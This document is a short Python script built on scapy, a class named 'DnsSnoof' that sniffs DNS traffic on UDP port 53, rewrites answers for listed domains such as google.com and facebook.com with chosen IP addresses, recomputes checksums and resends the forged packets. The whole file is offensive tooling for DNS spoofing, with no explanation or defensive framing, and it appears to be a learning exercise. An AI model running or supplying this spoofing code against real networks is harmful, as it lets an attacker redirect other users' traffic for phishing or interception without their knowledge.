import logging as log
from scapy.all import *

class DnsSnoof:
    def __init__(self, host_dict):
        self.host_dict = host_dict

    def __call__(self):
        log.info("Snoofing....")
        # Sniff DNS packets
        sniff(filter="udp and port 53", prn=self.callback)

    def callback(self, packet):
        if packet.haslayer(DNSRR):
            try:
                log.info(f'[original] {packet[DNSRR].summary()}')
                query_name = packet[DNSQR].qname
                if query_name in self.host_dict:
                    # Modify DNS response
                    packet[DNS].an = DNSRR(rrname=query_name, rdata=self.host_dict[query_name])
                    packet[DNS].ancount = 1
                    # Remove existing checksums and lengths for recalculation
                    del packet[IP].len
                    del packet[IP].chksum
                    del packet[UDP].len
                    del packet[UDP].chksum
                    log.info(f'[modified] {packet[DNSRR].summary()}')
                    # Send modified packet
                    send(packet)
                else:
                    log.info(f'[not modified] {packet[DNSRR].rdata}')
            except IndexError as error:
                log.error(f'Error handling packet: {error}')

if __name__ == '__main__':
    try:
        host_dict = {
            b"google.com.": "142.250.70.78",
            b"facebook.com.": "31.13.79.35"
        }
        # Configure logging
        log.basicConfig(format='%(asctime)s - %(message)s', level=log.INFO)
        # Create an instance of DnsSnoof and call it
        dns_snoof = DnsSnoof(host_dict)
        dns_snoof()
    except OSError as error:
        log.error(f'Error: {error}')